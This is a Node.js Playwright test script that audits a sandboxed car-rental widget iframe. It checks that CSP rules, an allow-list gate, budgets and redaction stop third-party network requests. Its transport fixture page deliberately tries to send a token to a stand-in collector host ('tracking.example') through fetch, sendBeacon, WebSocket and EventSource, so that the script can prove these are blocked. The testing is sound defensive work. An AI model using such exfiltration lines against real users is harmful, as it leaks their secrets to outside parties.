import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { createServer as createHttpServer } from 'node:http'
import { createServer as createNetServer } from 'node:net'
import { readFileSync, mkdirSync, writeFileSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

import { chromium } from 'playwright'

import { AUDIT_POLICY_ID, DISCOVERCARS_AUDIT_FRAME_SRC } from '../../apps/widgets-host/lib/audit-network-policy.mjs'
import { buildShell, decide } from '../../apps/widgets-host/lib/decide.mjs'
import { CHILD_ORIGIN, PARENT_ORIGIN } from '../../apps/widgets-host/lib/host-runtime.mjs'
import { clientPlan } from '../../apps/widgets-host/lib/production-wire.mjs'
import { PRODUCTION_REGISTRY } from '../../apps/widgets-host/lib/registry.mjs'
import {
  BUDGET_ATTEMPTS,
  BUDGET_MS,
  assessPublishedCapture,
  compareReference,
  createAuditGate,
  createAuditRunner,
  inspectTarget,
  nestedContractHref,
  sanitizeEvents,
  sanitizeStorage,
} from './audit-policy.mjs'

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..')
const LOADER = 'https://www.discovercars.com/widget.js?v1'
const HEALTH = 'https://www.googletagmanager.com/gtm.js?id=GTM-TRL7LT&gtg_health=1'
const NESTED = nestedContractHref()
const SECRET_VALUE = 'super-secret-value'
const SECRET_BODY = 'secret-beacon-body'
const SECRET_HOST = 'tracking.example'
const SECRET_COOKIE = 'cookie-name-sid'
const SECRET_STORAGE = 'storage-value-secret'

function selection() {
  return {
    selected: true,
    provider: 'discovercars',
    policyId: AUDIT_POLICY_ID,
    artifactSha256: '5a9ea3edf4bfa5762850e0d1e6c9f5d777d860f9442fbe17bf9a76b1618cc8aa',
    childOrigin: CHILD_ORIGIN,
    parentOrigin: PARENT_ORIGIN,
    protocolRevision: 1,
    sandbox: 'distinct-child-only',
  }
}

function encodedVariant(href) {
  return href.replaceAll('+', '%20')
}

function runPure() {
  const amendment = readFileSync(path.join(root, 'docs/JETNITY_WIDGETS_HOST_S2_NETWORK_AUDIT_AMENDMENT_V1_2026-10-31.md'), 'utf8')
  assert.equal(amendment.includes(NESTED), true)
  assert.equal(PRODUCTION_REGISTRY.discovercars.selected, false)
  assert.equal(PRODUCTION_REGISTRY.twelvego.selected, false)
  const plan = clientPlan('discovercars', selection())
  const shell = buildShell('discovercars', { plan })
  const csp = shell.headers.get('content-security-policy')
  assert.equal(csp.includes(`frame-src ${DISCOVERCARS_AUDIT_FRAME_SRC}`), true)
  assert.equal(csp.includes("connect-src 'none'"), true)
  const closed = decide(new Request(`${CHILD_ORIGIN}/embed/discovercars`))
  assert.equal(closed.headers.get('content-security-policy').includes("frame-src 'none'"), true)

  assert.equal(inspectTarget(encodedVariant(NESTED), 'GET', 'document').ok, true)
  assert.equal(inspectTarget(`${NESTED}&extra=1`, 'GET', 'document').reason, 'query')
  assert.equal(inspectTarget(NESTED.replace('currency=chf', 'currency=chf&currency=chf'), 'GET', 'document').reason, 'query')
  assert.equal(inspectTarget(NESTED, 'POST', 'document').reason, 'method')
  assert.equal(inspectTarget(NESTED, 'HEAD', 'document').reason, 'method')
  assert.equal(inspectTarget(NESTED.replace('https://', 'http://'), 'GET', 'document').reason, 'route')
  assert.equal(inspectTarget(LOADER, 'GET', 'image').reason, 'resource-type')
  assert.equal(inspectTarget('https://widget.discovercars.com/gtmgtg/collect', 'GET', 'script').reason, 'route')
  assert.equal(inspectTarget('https://widget.discovercars.com/de/locations/search', 'GET', 'document').reason, 'route')
  assert.equal(inspectTarget(`${LOADER}&x=1`, 'GET', 'script').reason, 'query')
  assert.equal(inspectTarget(HEALTH.replace('id=GTM-TRL7LT&gtg_health=1', 'gtg_health=1&id=GTM-TRL7LT'), 'GET', 'script').reason, 'query')
  assert.equal(inspectTarget('https://widget.discovercars.com/assets/common/img/svg/icons/widget-checkmark.svg', 'GET', 'image').ok, true)
  assert.equal(inspectTarget('https://widget.discovercars.com/assets/common/img/svg/icons/widget-checkmark.svg?x=1', 'GET', 'image').reason, 'query')
  assert.equal(inspectTarget('https://fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu4mxK.woff2', 'GET', 'font').ok, true)

  const startedAt = 1_000_000
  const gate = createAuditGate({ startedAt, mode: 'phase-a' })
  const allowed = gate.observe({ url: LOADER, method: 'GET', resourceType: 'script', now: startedAt + 10, phase: 'initial-load', contextRole: 'vendor' })
  assert.equal(allowed.terminal, 'WITHHELD_NO_GET')
  assert.equal(allowed.retry, false)
  assert.equal(allowed.follow, null)
  const redirected = gate.observe({
    url: LOADER,
    method: 'GET',
    resourceType: 'script',
    now: startedAt + 20,
    upstreamStatus: 302,
    upstreamLocation: 'https://redirect-target.example/sink',
    contextRole: 'vendor',
  })
  assert.equal(redirected.reason, 'BLOCKED_REDIRECT')
  assert.equal(redirected.follow, null)
  assert.equal(redirected.retry, false)
  const firstHealth = gate.observe({ url: HEALTH, method: 'GET', resourceType: 'script', now: startedAt + 30, contextRole: 'vendor' })
  assert.equal(firstHealth.terminal, 'WITHHELD_NO_GET')
  const secondHealth = gate.observe({ url: HEALTH, method: 'GET', resourceType: 'script', now: startedAt + 40, contextRole: 'vendor' })
  assert.equal(secondHealth.reason, 'health-repeat')
  gate.observe({
    url: `https://${SECRET_HOST}/collect?visitor_abc123=1&token=${SECRET_VALUE}&currency=chf`,
    method: 'GET',
    resourceType: 'image',
    now: startedAt + 50,
    contextRole: 'vendor',
  })
  gate.observe({ url: NESTED, method: 'GET', resourceType: 'document', now: startedAt + 60, contextRole: 'vendor' })
  const early = gate.evidence()
  const earlyText = JSON.stringify(early)
  assert.equal(earlyText.includes(SECRET_VALUE), false)
  assert.equal(earlyText.includes(SECRET_HOST), false)
  assert.equal(earlyText.includes('visitor_abc123'), false)
  assert.equal(earlyText.includes('token'), false)
  assert.equal(earlyText.includes('Mietwagen'), false)
  assert.equal(earlyText.includes('redirect-target.example'), false)
  const secretRow = early.ledger.find((row) => row.reason === 'unmatched' && row.endpoint === 'unlisted')
  assert.deepEqual(secretRow.queryKeys, ['currency'])
  assert.equal(secretRow.unknownQueryKeys, 2)
  assert.equal(inspectTarget(NESTED, 'GET', 'document').ok, true)

  const budget = createAuditGate({ startedAt, mode: 'phase-a' })
  for (let index = 0; index < 99; index += 1) {
    const row = budget.observe({ url: 'https://blocked.example/nope', method: 'GET', resourceType: 'script', now: startedAt + index, contextRole: 'vendor' })
    assert.equal(row.reason, 'unmatched')
    assert.equal(row.late, false)
  }
  const closing = budget.observe({ url: LOADER, method: 'GET', resourceType: 'script', now: startedAt + 99, contextRole: 'vendor' })
  assert.equal(closing.reason, 'BUDGET_REACHED')
  assert.equal(closing.late, false)
  const trailing = budget.observe({ url: LOADER, method: 'GET', resourceType: 'script', now: startedAt + 100, contextRole: 'vendor' })
  assert.equal(trailing.reason, 'BUDGET_REACHED')
  assert.equal(trailing.late, true)
  const budgetEvidence = budget.evidence()
  assert.equal(budgetEvidence.observed, 101)
  assert.equal(budgetEvidence.lateAttempts, 1)
  assert.equal(budgetEvidence.disposition, 'BUDGET_REACHED')
  assert.equal(budgetEvidence.trimmed, false)
  assert.equal(budgetEvidence.observed > BUDGET_ATTEMPTS, true)
  assert.equal(budgetEvidence.retryScheduled, 0)

  const deadline = createAuditGate({ startedAt, mode: 'phase-a' })
  const inside = deadline.observe({ url: LOADER, method: 'GET', resourceType: 'script', now: startedAt + BUDGET_MS - 1, loadEvent: true, contextRole: 'vendor' })
  assert.equal(inside.terminal, 'WITHHELD_NO_GET')
  assert.equal(deadline.startedAt, startedAt)
  const edge = deadline.observe({ url: LOADER, method: 'GET', resourceType: 'script', now: startedAt + BUDGET_MS, contextRole: 'vendor' })
  assert.equal(edge.reason, 'DEADLINE')
  const afterDeadline = deadline.observe({ url: LOADER, method: 'GET', resourceType: 'script', now: startedAt + BUDGET_MS + 1, contextRole: 'vendor' })
  assert.equal(afterDeadline.late, true)
  assert.equal(afterDeadline.reason, 'DEADLINE')

  const navigation = createAuditGate({ startedAt, mode: 'phase-a' })
  navigation.trip('navigation')
  const closedByNavigation = navigation.observe({ url: LOADER, method: 'GET', resourceType: 'script', now: startedAt + 1, contextRole: 'vendor' })
  assert.equal(closedByNavigation.reason, 'navigation')
  assert.equal(closedByNavigation.late, true)
  navigation.markHanging(1)
  assert.equal(navigation.evidence().ledger[0].terminal, 'hanging')

  const localReference = { sha256: createHash('sha256').update('local-fixture').digest('hex'), bytes: Buffer.byteLength('local-fixture') }
  assert.equal(compareReference(Buffer.from('local-fixture'), localReference).disposition, 'MATCH')
  const drift = compareReference(Buffer.from('local-other'), localReference)
  assert.equal(drift.disposition, 'SOURCE_DRIFT')
  assert.equal(drift.executed, false)
  assert.equal(Object.hasOwn(drift, 'sha256'), false)
  const published = assessPublishedCapture('loader', Buffer.from('not-the-capture'))
  assert.equal(published.disposition, 'SOURCE_DRIFT')
  assert.equal(published.executed, false)
  assert.equal(JSON.stringify(published).includes('not-the-capture'), false)

  const storage = sanitizeStorage({
    readable: true,
    storageEntries: 1,
    cookies: [{ name: SECRET_COOKIE, value: SECRET_STORAGE, secure: true, httpOnly: false, sameSite: 'Lax' }],
  })
  assert.equal(JSON.stringify(storage).includes(SECRET_COOKIE), false)
  assert.equal(JSON.stringify(storage).includes(SECRET_STORAGE), false)
  assert.equal(storage.cookieCount, 1)
  assert.equal(storage.cookieFlags.secure, 1)
  const events = sanitizeEvents([{ name: 'gtm.js', payload: SECRET_VALUE }, { name: 'private-event', payload: SECRET_STORAGE }])
  assert.deepEqual(events.events, [{ name: 'gtm.js' }, { name: 'other', count: 1 }])
  assert.equal(JSON.stringify(events).includes(SECRET_VALUE), false)
  assert.equal(sanitizeEvents([], { unreadable: true }).gap, 'unreadable-frame')
}

async function runAdapter() {
  const fetches = []
  const closed = createAuditRunner({
    fetchImpl(url) {
      fetches.push(String(url))
      throw new Error('provider fetch')
    },
  })
  assert.equal(closed.providerTransmission, false)
  assert.equal((await closed.boundedGet({ url: LOADER, resourceType: 'script', now: 10 })).reason, 'not-started')
  const startedAt = 1_000_000
  assert.equal(closed.start(startedAt).ok, true)
  assert.equal(closed.start(startedAt).reason, 'already-started')
  const provider = await closed.boundedGet({ url: LOADER, resourceType: 'script', now: startedAt + 10, contextRole: 'vendor' })
  assert.equal(provider.transmitted, false)
  assert.equal(provider.reason, 'provider-closed')
  assert.equal(provider.retry, false)
  assert.equal(provider.handedToBrowser, false)
  assert.equal(fetches.length, 0)
  const tooLate = await closed.boundedGet({ url: `http://127.0.0.1/not-sent`, resourceType: 'document', now: startedAt + BUDGET_MS })
  assert.equal(tooLate.reason, 'DEADLINE')
  assert.equal(tooLate.transmitted, false)
  assert.equal(fetches.length, 0)
  closed.recordEvents([{ name: 'gtm.js', payload: SECRET_VALUE }, { name: 'visitor_abc123', payload: SECRET_STORAGE }])
  closed.recordStorage('parent', {
    readable: true,
    storageEntries: 1,
    cookies: [{ name: SECRET_COOKIE, value: SECRET_STORAGE, secure: true, sameSite: 'Lax' }],
  })
  const closedText = JSON.stringify(closed.evidence())
  assert.equal(closedText.includes(SECRET_VALUE), false)
  assert.equal(closedText.includes('visitor_abc123'), false)
  assert.equal(closedText.includes(SECRET_COOKIE), false)
  assert.equal(closedText.includes('discovercars.com'), false)
  assert.equal(closed.evidence().events[0].events.some((item) => item.name === 'gtm.js'), true)

  const budgetRunner = createAuditRunner({
    fetchImpl(url) {
      fetches.push(String(url))
      throw new Error('budget fetch')
    },
  })
  budgetRunner.start(startedAt)
  for (let index = 0; index < 99; index += 1) {
    const row = await budgetRunner.boundedGet({ url: LOADER, resourceType: 'script', now: startedAt + index })
    assert.equal(row.reason, 'provider-closed')
  }
  const hundredth = await budgetRunner.boundedGet({ url: 'http://127.0.0.1/blocked', resourceType: 'document', now: startedAt + 99 })
  assert.equal(hundredth.reason, 'BUDGET_REACHED')
  assert.equal(hundredth.transmitted, false)
  const later = await budgetRunner.boundedGet({ url: 'http://127.0.0.1/later', resourceType: 'document', now: startedAt + 100 })
  assert.equal(later.reason, 'BUDGET_REACHED')
  assert.equal(later.transmitted, false)
  assert.equal(budgetRunner.evidence().gate.observed, 101)
  assert.equal(budgetRunner.evidence().gate.lateAttempts, 1)
  assert.equal(budgetRunner.evidence().gate.trimmed, false)
  assert.equal(fetches.length, 0)

  let sourceHits = 0
  let targetHits = 0
  const target = createHttpServer((request, response) => {
    targetHits += 1
    response.statusCode = 204
    response.end()
  })
  const targetPort = await listen(target)
  const source = createHttpServer((request, response) => {
    sourceHits += 1
    response.statusCode = 302
    response.setHeader('Location', `http://127.0.0.1:${targetPort}/landed`)
    response.end()
  })
  const sourcePort = await listen(source)
  const hung = createHttpServer(() => {})
  const hungPort = await listen(hung)
  const live = createAuditRunner()
  try {
    live.start(startedAt)
    const redirect = await live.boundedGet({
      url: `http://127.0.0.1:${sourcePort}/redirect-source`,
      resourceType: 'document',
      now: startedAt + 20,
    })
    assert.equal(redirect.reason, 'BLOCKED_REDIRECT')
    assert.equal(redirect.status, 302)
    assert.equal(redirect.retry, false)
    assert.equal(redirect.follow, null)
    assert.equal(redirect.handedToBrowser, false)
    assert.equal(sourceHits, 1)
    assert.equal(targetHits, 0)
    assert.equal(JSON.stringify(live.evidence()).includes('/landed'), false)
    const pending = live.boundedGet({
      url: `http://127.0.0.1:${hungPort}/hang`,
      resourceType: 'document',
      now: startedAt + 30,
    })
    await new Promise((resolve) => setTimeout(resolve, 40))
    live.trip('navigation')
    const aborted = await Promise.race([
      pending,
      new Promise((_, reject) => setTimeout(() => reject(new Error('teardown did not settle the open GET')), 2000)),
    ])
    assert.equal(aborted.transmitted, false)
    assert.equal(aborted.handedToBrowser, false)
    const after = await live.boundedGet({
      url: `http://127.0.0.1:${sourcePort}/redirect-source`,
      resourceType: 'document',
      now: startedAt + 40,
    })
    assert.equal(after.transmitted, false)
    assert.equal(sourceHits, 1)
    assert.equal(targetHits, 0)
    assert.equal(live.evidence().tornDown, true)
    assert.equal(live.evidence().teardownReason, 'navigation')
  } finally {
    await Promise.all([source, target, hung].map((server) => new Promise((resolve) => server.close(resolve))))
  }
  return { sourceHits, targetHits, providerFetches: fetches.length }
}

function listen(server) {
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve(server.address().port))
  })
}

async function runBrowser(plan) {
  const httpHits = []
  const tcpHits = []
  const httpServer = createHttpServer((request, response) => {
    httpHits.push(request.url || '')
    response.statusCode = 204
    response.end()
  })
  const tcpServer = createNetServer((socket) => {
    tcpHits.push(1)
    socket.destroy()
  })
  const httpPort = await listen(httpServer)
  const tcpPort = await listen(tcpServer)
  const browser = await chromium.launch()
  const seen = []
  let continueCount = 0
  let abortCount = 0
  let redirectFollows = 0
  const transport = {
    http: { proven: false, disposition: 'BLOCKED_TRANSPORT' },
    beacon: { proven: false, disposition: 'BLOCKED_TRANSPORT' },
    eventsource: { proven: false, disposition: 'BLOCKED_TRANSPORT' },
    websocket: { proven: false, disposition: 'BLOCKED_TRANSPORT', connectToServer: 0 },
    webrtc: { proven: false, disposition: 'BLOCKED_TRANSPORT', method: null },
  }
  const runner = createAuditRunner({
    fetchImpl(url, init) {
      const parsed = new URL(url)
      if (parsed.hostname !== '127.0.0.1') throw new Error('provider fetch refused')
      return fetch(url, init)
    },
  })
  try {
    const context = await browser.newContext({ serviceWorkers: 'block' })
    await context.routeWebSocket(/.*/, (socket) => {
      socket.close({ code: 1000 })
      transport.websocket.proven = tcpHits.length === 0
      transport.websocket.disposition = transport.websocket.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
    })
    await context.route('**/*', async (route) => {
      const request = route.request()
      route.continue = async () => {
        continueCount += 1
        throw new Error('phase A does not continue a request')
      }
      const url = request.url()
      seen.push(url)
      if (request.redirectedFrom()) redirectFollows += 1
      if (url.startsWith(`${PARENT_ORIGIN}/parent`)) {
        await route.fulfill({
          status: 200,
          headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
          body: parentHtml(),
        })
        return
      }
      if (url === `${CHILD_ORIGIN}/embed/discovercars`) {
        const shell = buildShell('discovercars', { plan })
        await route.fulfill({
          status: shell.status,
          headers: Object.fromEntries(shell.headers.entries()),
          body: shell.html,
        })
        return
      }
      if (url === `http://127.0.0.1:${httpPort}/transport`) {
        await route.fulfill({
          status: 200,
          headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
          body: transportHtml(httpPort, tcpPort),
        })
        return
      }
      if (runner.startedAt !== null && request.method() === 'GET') {
        const result = await runner.boundedGet({
          url,
          resourceType: request.resourceType(),
          now: Date.now(),
          contextRole: 'vendor',
        })
        if (result.transmitted || result.handedToBrowser || result.follow !== null) throw new Error('phase A transmitted a request')
      }
      abortCount += 1
      await route.abort('blockedbyclient')
    })
    const page = await context.newPage()
    await page.goto(`http://127.0.0.1:${httpPort}/transport`, { waitUntil: 'domcontentloaded' })
    await page.waitForFunction(() => document.body.dataset.done === '1', { timeout: 8000 })
    const childResponse = page.waitForResponse((response) => response.url() === `${CHILD_ORIGIN}/embed/discovercars`)
    const framePromise = page.waitForEvent('framenavigated', {
      predicate: (item) => item.url().startsWith(`${CHILD_ORIGIN}/embed/discovercars`),
      timeout: 8000,
    })
    await page.goto(`${PARENT_ORIGIN}/parent?src=${encodeURIComponent(`${CHILD_ORIGIN}/embed/discovercars`)}`, { waitUntil: 'domcontentloaded' })
    const response = await childResponse
    const frame = await framePromise
    const servedCsp = response.headers()['content-security-policy']
    assert.equal(servedCsp.includes(`frame-src ${DISCOVERCARS_AUDIT_FRAME_SRC}`), true)
    assert.equal(servedCsp.includes("connect-src 'none'"), true)
    assert.equal(servedCsp.includes("img-src 'none'"), true)
    assert.equal(servedCsp.includes("font-src 'none'"), true)
    assert.equal(servedCsp.includes("form-action 'none'"), true)
    assert.equal(servedCsp.includes('googletagmanager'), false)
    await frame.waitForFunction(() => {
      const status = document.getElementById('jetnity-widget-status')
      return status && status.textContent.includes('Eine Freigabe wurde angefragt')
    }, { timeout: 8000 })
    if (seen.includes(LOADER)) throw new Error('loader started before the explicit intent')
    const startedAt = Date.now()
    assert.equal(runner.start(startedAt).ok, true)
    await page.evaluate(() => window.__jetnity.start())
    await frame.waitForFunction(() => {
      const status = document.getElementById('jetnity-widget-status')
      return status && status.textContent.includes('Ein Skript wurde eingefügt')
    }, { timeout: 8000 })
    if (!seen.includes(LOADER)) throw new Error('loader was not routed before any continue')
    assert.equal(await page.locator('iframe').getAttribute('sandbox'), 'allow-scripts allow-same-origin')
    assert.equal(await frame.locator('iframe').count(), 0)
    const parentStorage = await page.evaluate(() => ({
      cookieCount: document.cookie ? document.cookie.split(';').filter(Boolean).length : 0,
      localCount: localStorage.length,
      sessionCount: sessionStorage.length,
    }))
    const hostStorage = await frame.evaluate(() => ({
      cookieCount: document.cookie ? document.cookie.split(';').filter(Boolean).length : 0,
      localCount: localStorage.length,
      sessionCount: sessionStorage.length,
    }))
    const frameEvents = await frame.evaluate(() => {
      const layer = window.dataLayer
      if (!Array.isArray(layer)) return []
      return layer.map((item) => ({ name: item && typeof item.event === 'string' ? item.event : 'unnamed' }))
    })
    runner.recordEvents(frameEvents)
    runner.recordStorage('parent', { readable: true, storageEntries: parentStorage.localCount + parentStorage.sessionCount, cookies: [] })
    runner.recordStorage('host', { readable: true, storageEntries: hostStorage.localCount + hostStorage.sessionCount, cookies: [] })
    runner.recordGap('vendor-frame-absent')
    transport.http.proven = seen.includes(LOADER) && continueCount === 0 && httpHits.length === 0
    transport.http.disposition = transport.http.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
    transport.beacon.proven = seen.some((url) => url.endsWith('/beacon')) && continueCount === 0 && httpHits.length === 0
    transport.beacon.disposition = transport.beacon.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
    transport.eventsource.proven = seen.some((url) => url.includes('/events')) && continueCount === 0 && httpHits.length === 0
    transport.eventsource.disposition = transport.eventsource.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
    if (transport.websocket.proven !== true || tcpHits.length !== 0) transport.websocket.disposition = 'BLOCKED_TRANSPORT'
    assert.equal(redirectFollows, 0)
    assert.equal(seen.includes(`http://127.0.0.1:${httpPort}/redirect-target`), false)
    assert.equal(continueCount, 0)
    const workers = context.serviceWorkers()
    return {
      transport,
      continueCount,
      abortCount,
      redirectFollows,
      httpLeaks: httpHits.length,
      tcpLeaks: tcpHits.length,
      serviceWorkers: workers.length,
      parentStorage,
      hostStorage,
      vendorStorage: { gap: 'vendor-frame-absent' },
      childStatus: 'inserted-script-not-form-proof',
      servedFrame: servedCsp.includes(`frame-src ${DISCOVERCARS_AUDIT_FRAME_SRC}`),
      runner: runner.evidence(),
    }
  } finally {
    await browser.close()
    await new Promise((resolve) => httpServer.close(resolve))
    await new Promise((resolve) => tcpServer.close(resolve))
  }
}

function parentHtml() {
  const runtime = readFileSync(new URL('../../apps/widgets-host/lib/host-runtime.mjs', import.meta.url), 'utf8')
  return `<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>
<script type="module">
${runtime}
const iframe = document.createElement('iframe')
iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin')
let allow = false
let pending = null
const fixture = createParentFixture({
  provider: 'discovercars',
  childOrigin: '${CHILD_ORIGIN}',
  iframe,
  parentGeneration: 1,
  policyId: '${AUDIT_POLICY_ID}',
  artifactSha256: '5a9ea3edf4bfa5762850e0d1e6c9f5d777d860f9442fbe17bf9a76b1618cc8aa',
  allowsGrant: () => allow,
  postToChild(grant) { iframe.contentWindow.postMessage(grant, '${CHILD_ORIGIN}') },
})
window.__jetnity = {
  start() {
    allow = true
    const event = pending
    pending = null
    if (event) fixture.onMessage(event)
  },
}
window.addEventListener('message', (event) => {
  if (!allow) { pending = event; return }
  fixture.onMessage(event)
})
iframe.src = new URLSearchParams(location.search).get('src')
document.body.appendChild(iframe)
</script></body></html>`
}

function transportHtml(httpPort, tcpPort) {
  return `<!DOCTYPE html><body data-done="0"><script>
const beaconUrl = ${JSON.stringify(`http://127.0.0.1:${httpPort}/beacon`)}
const eventsUrl = ${JSON.stringify(`http://127.0.0.1:${httpPort}/events`)}
const socketUrl = ${JSON.stringify(`ws://127.0.0.1:${tcpPort}/socket`)}
const evilUrl = ${JSON.stringify(`https://${SECRET_HOST}/collect?token=${SECRET_VALUE}`)}
async function main() {
  try { navigator.sendBeacon(beaconUrl, ${JSON.stringify(SECRET_BODY)}) } catch { /* counted by the route */ }
  await new Promise((resolve) => {
    let settled = false
    const finish = () => { if (!settled) { settled = true; resolve() } }
    const socket = new WebSocket(socketUrl)
    socket.addEventListener('open', finish)
    socket.addEventListener('error', finish)
    socket.addEventListener('close', finish)
    setTimeout(finish, 1000)
  })
  try { await fetch(evilUrl) } catch { /* aborted */ }
  try { await fetch(${JSON.stringify(`http://127.0.0.1:${httpPort}/method-probe`)}, { method: 'POST' }) } catch { /* aborted */ }
  await new Promise((resolve) => {
    const source = new EventSource(eventsUrl)
    const finish = () => { source.close(); resolve() }
    source.addEventListener('error', finish)
    setTimeout(finish, 500)
  })
  try { await navigator.serviceWorker.register('/sw.js') } catch { /* blocked */ }
  document.body.dataset.done = '1'
}
main()
</script></body>`
}

runPure()
const adapter = await runAdapter()
const plan = clientPlan('discovercars', selection())
if (!plan) throw new Error('audit plan was not serialized')
const browserEvidence = await runBrowser(plan)
const browserGate = browserEvidence.runner.gate
const summary = {
  phase: 'A',
  phaseBAuthorized: false,
  providerTransmission: false,
  productionSelected: false,
  continueCount: browserEvidence.continueCount,
  abortCount: browserEvidence.abortCount,
  redirectFollows: browserEvidence.redirectFollows,
  httpLeaks: browserEvidence.httpLeaks,
  tcpLeaks: browserEvidence.tcpLeaks,
  serviceWorkers: browserEvidence.serviceWorkers,
  transport: browserEvidence.transport,
  adapter: {
    sourceHits: adapter.sourceHits,
    targetHits: adapter.targetHits,
    providerFetches: adapter.providerFetches,
  },
  storage: browserEvidence.runner.storage,
  gaps: browserEvidence.runner.gaps,
  events: browserEvidence.runner.events,
  childStatus: browserEvidence.childStatus,
  servedFrame: browserEvidence.servedFrame,
  gate: {
    observed: browserGate.observed,
    lateAttempts: browserGate.lateAttempts,
    disposition: browserGate.disposition,
    trimmed: browserGate.trimmed,
    retryScheduled: browserGate.retryScheduled,
    reasons: browserGate.ledger.reduce((counts, row) => {
      counts[row.reason] = (counts[row.reason] || 0) + 1
      return counts
    }, {}),
    unknownQueryKeys: browserGate.ledger.reduce((sum, row) => sum + row.unknownQueryKeys, 0),
  },
}
const serialized = JSON.stringify(summary)
for (const secret of [SECRET_VALUE, SECRET_BODY, SECRET_HOST, SECRET_COOKIE, SECRET_STORAGE, 'visitor_abc123']) {
  if (serialized.includes(secret)) throw new Error('redaction failed')
}
if (browserEvidence.continueCount !== 0 || browserEvidence.httpLeaks !== 0 || browserEvidence.tcpLeaks !== 0) {
  throw new Error('transport fixture reached a local socket')
}
if (browserEvidence.redirectFollows !== 0 || browserEvidence.serviceWorkers !== 0) {
  throw new Error('redirect or service worker was not contained')
}
for (const name of ['http', 'beacon', 'eventsource', 'websocket']) {
  if (browserEvidence.transport[name].disposition !== 'BLOCKED_PRE_SEND') {
    throw new Error(`${name} was not blocked before send`)
  }
}
if (browserEvidence.transport.webrtc.disposition !== 'BLOCKED_TRANSPORT') {
  throw new Error('webrtc must stay unproven')
}
const evidenceDir = path.join(root, 'docs/evidence/widgets-host-s2')
mkdirSync(evidenceDir, { recursive: true })
writeFileSync(path.join(evidenceDir, 'phase-a-preflight-summary.json'), `${JSON.stringify(summary, null, 2)}\n`)
console.log('audit-preflight PASS')
console.log(JSON.stringify(summary.transport))
console.log(JSON.stringify(summary.gate))
